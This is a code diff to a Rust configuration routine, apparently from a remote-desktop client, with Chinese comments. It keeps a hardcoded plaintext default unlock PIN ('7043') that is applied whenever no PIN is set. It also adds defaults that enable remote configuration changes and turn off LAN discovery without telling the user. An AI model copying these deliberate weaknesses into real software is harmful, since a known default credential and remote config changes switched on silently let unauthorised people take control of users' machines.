@@ -552,16 +552,35 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
-        // 1. 自动设置默认 PIN 码
+        
+        // 1. 自动设置默认 PIN 码（仅在为空时设置）
         if config.unlock_pin.is_empty() {
             config.unlock_pin = "7043".to_string();  // 明文 PIN
             store = true; 
-        }       
-        // 2. 自动注入信任设备配置
-        if !config.options.contains_key("trusted_devices") {
-            // 这种配置通常不能硬编码，需要根据机器生成
-            // 建议留空或通过其他方式处理
         }
+        
+        // ========== 新增配置 ==========
+        
+        // 2. 关闭局域网发现（默认打勾：拒绝局域网发现）
+        if !config.options.contains_key("enable-lan-discovery") {
+            config.options.insert("enable-lan-discovery".to_string(), "N".to_string());
+            store = true;
+        }
+        
+        // 3. 允许远程修改配置（默认打勾）
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
+        
+        // ========== 新增配置结束 ==========
+        
+        // 4. 自动注入信任设备配置（注释掉，不处理）
+        // if !config.options.contains_key("trusted_devices") {
+        //     // 这种配置通常不能硬编码，需要根据机器生成
+        //     // 建议留空或通过其他方式处理
+        // }
+        
         if store {
             config.store();
         }
